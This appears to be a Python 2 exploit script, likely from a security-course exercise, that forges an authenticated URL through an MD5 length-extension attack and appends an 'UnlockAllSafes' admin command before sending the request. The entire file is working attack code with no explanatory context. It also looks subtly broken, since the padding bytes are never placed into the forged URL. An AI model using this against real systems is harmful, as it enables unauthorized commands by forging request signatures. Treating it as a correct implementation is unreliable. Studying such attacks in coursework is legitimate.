from pymd5 import md5, padding
import httplib, urlparse, sys
import urllib

url = sys.argv[1]

length_of_m = 76
m_bits = (length_of_m + len(padding(length_of_m * 8)))* 8

h = md5(state="402a574d265dc212ee64970f159575d0".decode("hex"), count=m_bits)

x = "&command3=UnlockAllSafes"
h.update(x)
# print h.hexdigest()

tokenLoc = url.find("402a574d265dc212ee64970f159575d0")
endLoc = url.find("&user=admin&command1=ListFiles&command2=NoOp")
updatedURL = url[:tokenLoc] + h.hexdigest() + url[endLoc:] + x

urllen1 = "________" + url[endLoc:] + x
urllen2 = len(urllen1)

print urllen1
print urllen2

print updatedURL

parsedUrl = urlparse.urlparse(updatedURL)

conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
